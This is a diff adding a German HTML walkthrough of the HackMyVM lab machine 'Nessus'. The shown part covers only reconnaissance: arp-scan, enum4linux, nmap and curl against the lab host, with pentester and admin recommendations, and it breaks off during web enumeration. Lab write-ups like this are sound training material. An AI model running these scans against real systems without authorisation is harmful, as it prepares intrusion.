@@ -1,0 +1,1650 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nessus - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+  <div class="header-bg">
+        <h1>Nessus - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">CrackStation</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">evil-winrm</div>
+                <div class="tool-item">crackmapexec</div>
+                <div class="tool-item">gcc (mingw)</div>
+                <div class="tool-item">Powershell</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc-admin">Proof of Concept: Erlangen des Administrator-Zugriffs</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Als ersten Schritt meiner Erkundung im Zielnetzwerk nutzte ich das Tool arp-scan, um aktive Hosts in meinem lokalen Subnetz zu entdecken. Der Befehl <code>arp-scan -l</code> sendet ARP-Anfragen an alle Adressen im lokalen Netzwerk und zeigt die Antworten an. Die Ausgabe wird anschließend mit <code>grep &quot;PCS&quot;</code> gefiltert, um spezifisch nach Geräten mit &quot;PCS&quot; in der Anbieterkennung der MAC-Adresse zu suchen. Abschließend extrahiert der <code>awk &#x27;{print $1}&#x27;</code> Befehl das erste Feld der Ausgabe, welches die IP-Adresse des gefundenen Hosts sein sollte. Dies ist eine effiziente Methode, um schnell potenzielle Ziele im lokalen Segment zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Methode ist grundlegend, aber sehr effektiv, um die IP-Adresse des Ziels zu finden, wenn es sich im selben Netzwerksegment wie der Angreifer befindet. Das Filtern nach &quot;PCS&quot; war hier der entscheidende Hinweis, um das spezifische Zielgerät unter Umständen mehreren gefundenen Hosts schnell zu isolieren. Es zeigt, dass selbst einfache Netzwerk-Scanning-Techniken wertvolle Informationen liefern können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne Pentests immer mit einer gründlichen passiven und aktiven Aufklärung, um die Angriffsfläche zu verstehen. Einfache Tools wie arp-scan sind dabei unverzichtbar. Notiere alle gefundenen IP-Adressen und Hostnamen.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere Network Access Control (NAC) oder segmentiere das Netzwerk, um unerlaubte ARP-Scans und die schnelle Identifizierung von Hosts zu erschweren oder zu verhindern. Überprüfe und anonymisiere ggf. die MAC-Adressen von virtuellen Maschinen oder Geräten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep &quot;PCS&quot; | awk &#x27;{print $1}&#x27;</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">192.168.2.65</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die IP-Adresse 192.168.2.65 identifiziert wurde, habe ich den Hostnamen &#x27;nessus.hmv&#x27; zu meiner lokalen /etc/hosts Datei hinzugefügt. Dies ermöglicht mir, den Host zukünftig über seinen Namen statt über die IP-Adresse anzusprechen, was die Befehle oft lesbarer macht und in einigen Szenarien notwendig sein kann (z.B. bei vhost-basierten Webanwendungen). Die Information &quot;hosts 192.168.2.65 nessus.hmv&quot; dokumentiert diesen Schritt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Anpassen der hosts-Datei ist Standardpraxis für Pentests, um die Verwaltung von Zielsystemen zu vereinfachen. Es ist ein kleiner, aber notwendiger Schritt für eine effiziente weitere Vorgehensweise.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Halte deine /etc/hosts-Datei für aktive Ziele auf dem neuesten Stand.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass interne Hostnamen nicht über leicht abfragbare externe Dienste oder Lecks öffentlich werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.65   nessus.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Nächstes führe ich eine SMB/NetBIOS-Enumeration mit enum4linux durch (<code>enum4linux -a 192.168.2.65</code>). Dieses Tool sammelt Informationen über Shares, Benutzer, Gruppen und andere Details über das SMB/NetBIOS-Protokoll. Die Ausgabe zeigt die <span class="command">WORKGROUP</span> und den NetBIOS-Namen des Computers: <span class="command">NESSUS</span>. Es zeigt jedoch auch, dass der Server <span class="password">doesn&#x27;t allow session using username &#x27;&#x27;, password &#x27;&#x27;</span>, was bedeutet, dass eine anonyme Null-Session nicht m&ouml;glich ist und die meisten weiteren Tests von enum4linux abgebrochen werden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die SMB-Enumeration lieferte den Computernamen und die Workgroup, aber die fehlende Unterstützung für Null-Sessions schränkt den Informationsgewinn ohne Anmeldedaten stark ein. Dies deutet darauf hin, dass SMB/NetBIOS wahrscheinlich nicht der primäre Weg zum Initial Access ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe SMB-Enumeration durch, aber sei bereit, zu anderen Vektoren zu wechseln, wenn der anonyme Zugriff stark eingeschränkt ist. Die Workgroup und der Computername sind dennoch nützlich.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere Null-Sessions auf Windows-Systemen. Konfiguriere SMB/NetBIOS so, dass keine Informationen ohne Authentifizierung preisgegeben werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.65</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+Starting enum4linux v0.9.1 ( [Link: http://labs.portcullis.co.uk/application/enum4linux/ | Ziel: http://labs.portcullis.co.uk/application/enum4linux/] ) on Fri Jun 27 22:31:03 2025
+
+ =========================================(<span class="command"> Target Information </span>)=========================================
+
+Target ........... <span class="command">192.168.2.65</span>
+RID Range ........ <span class="command">500-550,1000-1050</span>
+Username ......... <span class="command">''</span>
+Password ......... <span class="command">''</span>
+Known Usernames .. <span class="command">administrator, guest, krbtgt, domain admins, root, bin, none</span>
+
+
+ ============================(<span class="command"> Enumerating Workgroup/Domain on 192.168.2.65 </span>)============================
+
+
+<span class="password">[+] Got domain/workgroup name: WORKGROUP</span>
+
+
+ ================================(<span class="command"> Nbtstat Information for 192.168.2.65 </span>)================================
+
+Looking up status of <span class="command">192.168.2.65</span>
+	<span class="command">NESSUS          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span>
+	<span class="command">WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span>
+	<span class="command">NESSUS          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span>
+
+	<span class="command">MAC Address = 08-00-27-E0-80-47</span>
+
+ ===================================(<span class="command"> Session Check on 192.168.2.65 </span>)===================================
+
+
+<span class="password">[E] Server doesn't allow session using username '', password ''. Aborting remainder of tests.</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich führe einen umfassenden Nmap-Scan mit Dienst- und Betriebssystemerkennung sowie Standard-Skripten durch (<code>-sS -sC -sV -p- -Pn -AO</code>). Die Option <code>-Pn</code> überspringt den Host-Discovery-Schritt und geht davon aus, dass der Host aktiv ist. Die Option <code>-AO</code> wird nicht standardmäßig in Nmap-Dokumentation gefunden und könnte ein Tippfehler oder ein benutzerdefiniertes Skript sein, aber der Kontext deutet auf eine umfassende OS-Erkennung hin. Die Ausgabe listet mehrere offene Ports auf: 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds), 5985 (http - Microsoft HTTPAPI), 8834 (ssl/nessus-xmlrpc?), 47001 (http - Microsoft HTTPAPI) und höhere MSRPC-Ports. Besonders interessant ist Port 8834, der als <span class="command">ssl/nessus-xmlrpc?</span> identifiziert wird und in der Fingerprint-Ausgabe <span class="command">Server: NessusWWW</span> zeigt. Dies deutet stark darauf hin, dass hier die Nessus-Schwachstellen-Scanner-Oberfläche läuft. Die OS-Erkennung schätzt das System als <span class="command">Microsoft Windows Server 2022</span> ein. Die SMB-Skripte zeigen <span class="command">Message signing enabled but not required</span>. Die <code>TRACEROUTE</code> Informationen sind ebenfalls enthalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Nmap-Scan liefert entscheidende Hinweise. Die offene Nessus-Oberfläche auf Port 8834 ist das Hauptziel. Nessus-Installationen sind oft Ziele, da die Benutzeroberfläche selbst Schwachstellen aufweisen kann oder Standardanmeldedaten verwendet werden. Die Windows Server 2022 OS-Erkennung ist wichtig. Die SMB-Informationen sind weniger kritisch, da Null-Sessions fehlschlugen, aber der offene Port 445 bleibt ein Vektor, wenn Anmeldedaten gefunden werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Nessus-Oberfläche auf Port 8834. Versuche, auf die Weboberfläche zuzugreifen und nach Anmeldeformularen zu suchen. Recherchiere bekannte Schwachstellen f&uuml;r die gefundene Nessus-Version. Beachte die OS-Informationen f&uuml;r sp&auml;tere PE-Versuche.
+                <br><strong>Empfehlung (Admin):</strong> Schütze die Nessus-Oberfläche streng (Firewall, starke Authentifizierung, Multi-Faktor). Ändere Standard-Ports, wenn m&ouml;glich. Halte Nessus und das zugrunde liegende Betriebssystem aktuell. Aktiviere SMB-Signierung und deaktiviere SMBv1. Schließe alle nicht benötigten Ports.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]  
+└─# <span class="command">nmap -sS -sC -sV -p- -Pn -AO 192.168.2.65</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 22:30 CEST
+Nmap scan report for <span class="command">nessus.hmv (192.168.2.65)</span>
+Host is up (<span class="command">0.00014s latency</span>).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE            VERSION
+<span class="command">135/tcp</span>   <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">139/tcp</span>   <span class="password">open</span>  <span class="command">netbios-ssn</span>        <span class="command">Microsoft Windows netbios-ssn</span>
+<span class="command">445/tcp</span>   <span class="password">open</span>  <span class="command">microsoft-ds?</span>
+<span class="command">5985/tcp</span>  <span class="password">open</span>  <span class="command">http</span>               <span class="command">Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+|_<span class="command">http-server-header: Microsoft-HTTPAPI/2.0</span>
+|_<span class="command">http-title: Not Found</span>
+<span class="command">8834/tcp</span>  <span class="password">open</span>  <span class="command">ssl/nessus-xmlrpc?</span>
+| <span class="command">fingerprint-strings:</span> 
+|   <span class="command">GetRequest:</span> 
+|     <span class="command">HTTP/1.1 200 OK</span>
+|     <span class="command">Cache-Control: must-revalidate</span>
+|     <span class="command">X-Frame-Options: DENY</span>
+|     <span class="command">Content-Type: text/html</span>
+|     <span class="command">ETag: fc785d9fb222132265fb83f9adb1608e</span>
+|     <span class="command">Connection: close</span>
+|     <span class="command">X-XSS-Protection: 1; mode=block</span>
+|     <span class="command">Server: NessusWWW</span>
+|     <span class="command">Date: Fri, 27 Jun 2025 20:31:45 GMT</span>
+|     <span class="command">X-Content-Type-Options: nosniff</span>
+|     <span class="command">Content-Length: 1217</span>
+|     <span class="command">Content-Security-Policy: upgrade-insecure-requests; block-all-mixed-content; form-action 'self'; frame-ancestors 'none'; frame-src https://store.tenable.com; default-src 'self'; connect-src 'self' www.tenable.com; script-src 'self' www.tenable.com; img-src 'self' data:; style-src 'self' www.tenable.com; object-src 'none'; base-uri 'self';</span>
+|     <span class="command">Strict-Transport-Security: max-age=31536000</span>
+|     <span class="command">Expect-CT: max-age=0</span>
+|     &lt;!doctype html&gt;
+|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot; /&gt;
+|_    &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-inse
+| <span class="command">ssl-cert: Subject: commonName=WIN-C05BOCC7F0H/organizationName=Nessus Users United/stateOrProvinceName=NY/countryName=US</span>
+| <span class="command">Not valid before: 2024-10-18T17:36:17</span>
+|_<span class="command">Not valid after:  2028-10-17T17:36:17</span>
+|_<span class="command">ssl-date: TLS randomness does not represent time</span>
+<span class="command">47001/tcp</span> <span class="password">open</span>  <span class="command">http</span>               <span class="command">Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+|_<span class="command">http-title: Not Found</span>
+|_<span class="command">http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="command">49664/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49665/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49666/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49667/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49668/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49671/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="command">SF-Port8834-TCP:V=7.95%T=SSL%I=7%D=6/27%Time=685EFFB1%P=x86_64-pc-linux-gn</span>
+<span class="command">SF:u%r(GetRequest,788,&quot;HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x20must-re</span>
+<span class="command">SF:validate\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text/html\r\nE</span>
+<span class="command">SF:Tag:\x20fc785d9fb222132265fb83f9adb1608e\r\nConnection:\x20close\r\nX-X</span>
+<span class="command">SF:SS-Protection:\x201;\x20mode=block\r\nServer:\x20NessusWWW\r\nDate:\x20</span>
+<span class="command">SF:Fri,\x2027\x20Jun\x202025\x2020:31:45\x20GMT\r\nX-Content-Type-Options:</span>
+<span class="command">SF:\x20nosniff\r\nContent-Length:\x201217\r\nContent-Security-Policy:\x20u</span>
+<span class="command">SF:pgrade-insecure-requests;\x20block-all-mixed-content;\x20form-action\x2</span>
+<span class="command">SF:0'self';\x20frame-ancestors\x20'none';\x20frame-src\x20https://store\.t</span>
+<span class="command">SF:enable\.com;\x20default-src\x20'self';\x20connect-src\x20'self'\x20www\
+SF:.tenable\.com;\x20script-src\x20'self'\x20www\.tenable\.com;\x20img-src
+SF:\x20'self'\x20data:;\x20style-src\x20'self'\x20www\.tenable\.com;\x20ob</span>
+<span class="command">SF:ject-src\x20'none';\x20base-uri\x20'self';\r\nStrict-Transport-Security</span>
+<span class="command">SF::\x20max-age=31536000\r\nExpect-CT:\x20max-age=0\r\n\r\n&lt;!doctype\x20ht</span>
+<span class="command">SF:ml&gt;\n&lt;html\x20lang=&quot;en&quot;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x2</span>
+<span class="command">SF:0\x20\x20\x20&lt;meta\x20http-equiv=&quot;X-UA-Compatible&quot;\x20content=&quot;IE=ed</span>
+<span class="command">SF:ge,chrome=1&quot;\x20/&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equi</span>
+<span class="command">SF:v=&quot;Content-Security-Policy&quot;\x20content=&quot;upgrade-inse&quot;);</span>
+MAC Address: <span class="command">08:00:27:E0:80:47 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Microsoft Windows 2022</span>
+<span class="command">OS CPE: cpe:/o:microsoft:windows_server_2022</span>
+<span class="command">OS details: Microsoft Windows Server 2022</span>
+Network Distance: <span class="command">1 hop</span>
+Service Info: <span class="command">OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+Host script results:
+| <span class="command">smb2-security-mode:</span> 
+|   <span class="command">3:1:1:</span> 
+|_    <span class="command">Message signing enabled but not required</span>
+|_<span class="command">nbstat: NetBIOS name: NESSUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:e0:80:47 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+| <span class="command">smb2-time:</span> 
+|   <span class="command">date: 2025-06-27T20:33:32</span>
+|_  <span class="command">start_date: N/A</span>
+|_<span class="command">clock-skew: -1s</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+<span class="command">1   0.14 ms nessus.hmv (192.168.2.65)</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 195.45 seconds</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem umfassenden Nmap-Scan liste ich die Ports auf, die als <span class="password">open</span> identifiziert wurden. Diese Liste enthält die &quot;Eingangstüren&quot; zum System und lenkt meine weitere Aufklärung. Die offenen Ports sind 135, 139, 445 (SMB/RPC), 5985 (WinRM/HTTPAPI), 8834 (Nessus SSL/HTTP) und 47001 sowie höhere MSRPC-Ports. Port 8834 ist dabei besonders hervorzuheben, da er auf die Nessus-Oberfläche hindeutet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Liste der offenen Ports gibt einen klaren Überblick &uuml;ber die verf&uuml;gbaren Dienste. SMB/RPC-Ports sind Standard auf Windows. Port 5985 deutet auf Windows Remote Management (WinRM) hin, was f&uuml;r sp&auml;tere Zugriffe relevant sein k&ouml;nnte. Der Nessus-Port 8834 ist das offensichtlichste Ziel f&uuml;r den Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Enumeration und Interaktion mit den identifizierten offenen Diensten, insbesondere Nessus auf 8834 und WinRM auf 5985.
+                <br><strong>Empfehlung (Admin):</strong> Schließe alle nicht benötigten Ports und sichere notwendige Dienste (SMB, WinRM, Nessus) streng ab.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">open:</span>
+
+<span class="command">135/tcp</span>   <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">139/tcp</span>   <span class="password">open</span>  <span class="command">netbios-ssn</span>        <span class="command">Microsoft Windows netbios-ssn</span>
+<span class="command">445/tcp</span>   <span class="password">open</span>  <span class="command">microsoft-ds?</span>
+<span class="command">5985/tcp</span>  <span class="password">open</span>  <span class="command">http</span>               <span class="command">Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="command">8834/tcp</span>  <span class="password">open</span>  <span class="command">ssl/nessus-xmlrpc?</span>
+<span class="command">47001/tcp</span> <span class="password">open</span>  <span class="command">http</span>               <span class="command">Microsoft HTTPAPI httpd 2.0 (SSSP/UPnP)</span>
+<span class="command">49664/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49665/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49666/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49667/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49668/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49671/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+</pre></div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Hier die Web Enumeration-Schritte einfügen -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche, auf die Nessus-Oberfläche auf Port 8834 über HTTP zuzugreifen (<code>http://nessus.hmv:8834/</code>). Die Antwort <span class="password">Bad Request</span> und die Meldung &quot;<span class="command">Reason: You&#x27;re speaking plain HTTP to an SSL-enabled server port. Instead, please use the HTTPS scheme to access this URL.</span>&quot; zeigen eindeutig, dass Port 8834 SSL/TLS (HTTPS) erfordert und keine unverschlüsselten HTTP-Verbindungen akzeptiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Anforderung von HTTPS ist eine gute Sicherheitspraxis. Es bedeutet, dass die Kommunikation mit der Nessus-Oberfläche verschlüsselt ist. Ich muss meine Zugriffsversuche auf HTTPS umstellen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ein Port als SSL/TLS identifiziert wird, versuche immer den Zugriff über HTTPS. Nutze Tools, die SSL/TLS unterstützen (curl -k, Browser, etc.).
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass kritische Webservices immer HTTPS verwenden und HTTP-Zugriffe umgeleitet oder blockiert werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://nessus.hmv:8834/</span>
+<span class="password">Bad Request</span>
+
+<span class="command">Your browser sent a request that this server could not understand.</span>
+<span class="command">Reason: You're speaking plain HTTP to an SSL-enabled server port.</span>
+<span class="command">Instead, please use the HTTPS scheme to access this URL.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche nun den Zugriff auf Port 8834 über HTTPS (<code>https://192.168.2.65:8834</code>). Ich verwende <code>curl -k -Iv</code>. Die Option <code>-k</code> (oder `--insecure`) ist notwendig, um Zertifikatsfehler zu ignorieren (da es sich wahrscheinlich um ein selbstsigniertes Zertifikat handelt oder das Ausstellerzertifikat nicht bekannt ist), <code>-I</code> f&uuml;r einen HEAD-Request und <code>-v</code> f&uuml;r ausf&uuml;hrliche Informationen (inkl. TLS-Details und Headern). Die Ausgabe zeigt den erfolgreichen TLSv1.3 Handshake, die Zertifikatsdetails (Subject CN=<span class="command">WIN-C05BOCC7F0H</span>, Not valid before/after, Issuer), die Meldung &quot;<span class="password">SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.</span>&quot; (best&auml;tigt das Zertifikatsproblem) und die HTTP-Antwort. Die Antwort ist <span class="password">HTTP/1.1 405 Method not Allowed</span> f&uuml;r den HEAD-Request auf den Root-Pfad (<code>/</code>). Die Header zeigen <span class="command">Server: NessusWWW</span> und verschiedene Sicherheits-Header (<span class="command">X-Frame-Options: DENY</span>, <span class="command">X-XSS-Protection</span>, <span class="command">X-Content-Type-Options: nosniff</span>, <span class="command">Content-Security-Policy</span>, <span class="command">Strict-Transport-Security</span>).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche HTTPS-Zugriff best&auml;tigt, dass die Nessus-Oberfläche auf 8834 erreichbar ist. Der 405-Fehler f&uuml;r HEAD am Root ist zu erwarten, da die API oder Oberfläche wahrscheinlich POST-Anfragen oder spezifische Pfade f&uuml;r den Login ben&ouml;tigt. Die vorhandenen Sicherheits-Header sind positiv, zeigen aber, dass die Oberfläche geschützt ist. Die Zertifikatsinformationen sind f&uuml;r die Authentifizierung (Vertrauen) relevant, aber f&uuml;r den Angriff kann ich sie vorerst ignorieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze den Browser, um die Nessus-Oberfläche zu besuchen und das Anmeldeformular zu finden. Analysiere den Traffic mit einem Web-Proxy (Burp Suite, OWASP ZAP), um die Login-Anfrage zu verstehen. Fuzzing mit GET/POST auf / oder bekannten API-Endpunkten.
+                <br><strong>Empfehlung (Admin):</strong> Installiere vertrauenswürdige SSL/TLS-Zertifikate. Achte auf die Konfiguration der Sicherheits-Header.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">curl -k -Iv https://192.168.2.65:8834</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+*   Trying 192.168.2.65:8834...
+* <span class="command">ALPN: curl offers h2,http/1.1</span>
+* <span class="command">TLSv1.3 (OUT), TLS handshake, Client hello (1):</span>
+* <span class="command">TLSv1.3 (IN), TLS handshake, Server hello (2):</span>
+* <span class="command">TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):</span>
+* <span class="command">TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):</span>
+* <span class="command">TLSv1.3 (IN), TLS handshake, Certificate (11):</span>
+* <span class="command">TLSv1.3 (IN), TLS handshake, CERT verify (15):</span>
+* <span class="command">TLSv1.3 (IN), TLS handshake, Finished (20):</span>
+* <span class="command">TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):</span>
+* <span class="command">TLSv1.3 (OUT), TLS handshake, Finished (20):</span>
+* <span class="command">SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS</span>
+* <span class="command">ALPN: server did not agree on a protocol. Uses default.</span>
+* <span class="command">Server certificate:</span>
+*  <span class="command">subject: O=Nessus Users United; OU=Nessus Server; L=New York; C=US; ST=NY; CN=WIN-C05BOCC7F0H</span>
+*  <span class="command">start date: Oct 18 17:36:17 2024 GMT</span>
+*  <span class="command">expire date: Oct 17 17:36:17 2028 GMT</span>
+*  <span class="command">issuer: O=Nessus Users United; OU=Nessus Certification Authority; L=New York; C=US; ST=NY; CN=Nessus Certification Authority</span>
+*  <span class="password">SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.</span>
+*   <span class="command">Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption</span>
+* <span class="password">Connected to 192.168.2.65 (192.168.2.65) port 8834</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; <span class="command">Host: 192.168.2.65:8834</span>
+&gt; <span class="command">User-Agent: curl/8.13.0</span>
+&gt; <span class="command">Accept: */*</span>
+&gt; 
+* <span class="command">TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span>
+* <span class="command">TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span>
+* <span class="command">Request completely sent off</span>
+&lt; <span class="password">HTTP/1.1 405 Method not Allowed</span>
+Cache-Control: <span class="command">no-cache, no-store, must-revalidate</span>
+X-Frame-Options: <span class="command">DENY</span>
+Content-Type: <span class="command">application/json</span>
+Connection: <span class="command">close</span>
+X-XSS-Protection: <span class="command">1; mode=block</span>
+Server: <span class="command">NessusWWW</span>
+Date: <span class="command">Fri, 27 Jun 2025 20:53:11 GMT</span>
+X-Content-Type-Options: <span class="command">nosniff</span>
+Content-Length: <span class="command">61</span>
+Content-Security-Policy: <span class="command">upgrade-insecure-requests; block-all-mixed-content; form-action 'self'; frame-ancestors 'none'; frame-src https://store.tenable.com; default-src 'self'; connect-src 'self' www.tenable.com; script-src 'self' www.tenable.com; img-src 'self' data:; style-src 'self' www.tenable.com; object-src 'none'; base-uri 'self';</span>
+Strict-Transport-Security: <span class="command">max-age=31536000</span>
+Expires: <span class="command">0</span>
+Expect-CT: <span class="command">max-age=0</span>
+Pragma: <span class="command">no-cache</span>
+&lt; 
+
+* <span class="password">shutting down connection #0</span>
+</pre></div>
+            </div>
+            <p class="analysis">
